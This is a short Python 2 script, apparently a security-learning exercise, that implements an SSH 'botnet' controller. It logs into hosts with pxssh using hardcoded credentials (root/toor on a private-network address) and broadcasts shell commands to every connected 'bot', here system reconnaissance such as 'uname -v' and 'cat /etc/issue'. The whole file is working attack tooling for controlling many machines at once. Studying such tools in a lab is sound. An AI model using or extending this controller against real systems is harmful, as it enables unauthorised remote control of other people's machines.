import optparse
import pxssh

class Client: #create class for botnet client
	def __init__(self, host, user, password):
		self.host = host
		self.user = user
		self.password = password
		self.session = self.connect()

	def connect(self):
		try:
			s = pxssh.pxssh()
			s.login(self.host, self.user, self.password) #attempt to login
			return s
		except Exception, e:
			print e
			print '[-] Error connecting'

	def send_command(self,cmd):
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before

def botnetCommand(command): #send command to the Client objects in the botnet arry
	for client in botnet:
		output = client.send_command(command)
		print '[*] Output from ' + client.host
		print '[+] the output is: \n' + output + '\n'

def addClient(host, user, password): #create an object from the Client class
	client = Client(host,user,password)
	botnet.append(client) #add client to the botnet arry

#Global variable
botnet = [] #defining botnet as empty array

def main():
	
	#Create client objects with the addClient function
	addClient('192.168.0.106', 'root', 'toor')
	#addClient('192.168.0.108', 'joseph', 'poop')
	#send commands to the bots
	botnetCommand('uname -v')
	botnetCommand('cat /etc/issue')
	

if __name__ == '__main__':
	main()
